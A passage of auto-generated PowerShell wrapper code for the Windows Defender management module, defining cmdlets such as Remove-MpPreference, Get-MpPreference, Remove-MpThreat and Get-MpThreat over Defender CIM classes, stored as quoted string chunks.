'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\r\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\r\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automati"
"on.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowSwitchToAsyncInspection')) {\r\n          [object]$__cmdletization_value = ${AllowSwitchToAsyncInspection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowSwitchToAsyncInspection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleOffset')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleOffset}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleOffset'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTDTFeature')) {\r\n          [object]$__cmdletization_value = ${DisableTDTFeature}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTDTFeature'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSmtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSmtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSmtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableQuicParsing')) {\r\n          [object]$__cmdletization_value = ${DisableQuicParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableQuicParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkProtectionReputationMode')) {\r\n          [object]$__cmdletization_value = ${NetworkProtectionReputationMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkProtectionReputationMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IntelTDTEnabled')) {\r\n          [object]$__cmdletization_value = ${IntelTDTEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IntelTDTEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions_Id')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions_Id'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_RuleSpecificExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_RuleSpecificExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_RuleSpecificExclusions'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('OobeEnableRtpAndSigUpdate')) {\r\n          [object]$__cmdletization_value = ${OobeEnableRtpAndSigUpdate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'OobeEnableRtpAndSigUpdate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PerformanceModeStatus')) {\r\n          [object]$__cmdletization_value = ${PerformanceModeStatus}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerformanceModeStatus'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuickScanIncludeExclusions')) {\r\n          [object]$__cmdletization_value = ${QuickScanIncludeExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuickScanIncludeExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCacheMaintenance')) {\r\n          [object]$__cmdletization_value = ${DisableCacheMaintenance}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCacheMaintenance'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoveScanningThreadPoolCap')) {\r\n          [object]$__cmdletization_value = ${RemoveScanningThreadPoolCap}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoveScanningThreadPoolCap'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)"
"\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Get-MpPreference\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#root\\Microsoft\\Windows\\Defender\\MSFT_MpPreference')]\r\n\r\n    param(\r\n    \r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpPreference' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Remove-MpThreat\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Remove0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Remove0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Remove0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*'\r\n        \r\n\r\nfunction Get-MpThreat\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreat')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${ThreatID})\r\n        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpThreat' -Alias '*'\r\n        \r\n"
"\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-MpThreatCatalog\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpThreatCatalog')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('ID')]\r\n    [ValidateNotNull()]\r\n    [long[]]\r\n    ${ThreatID},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ById')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                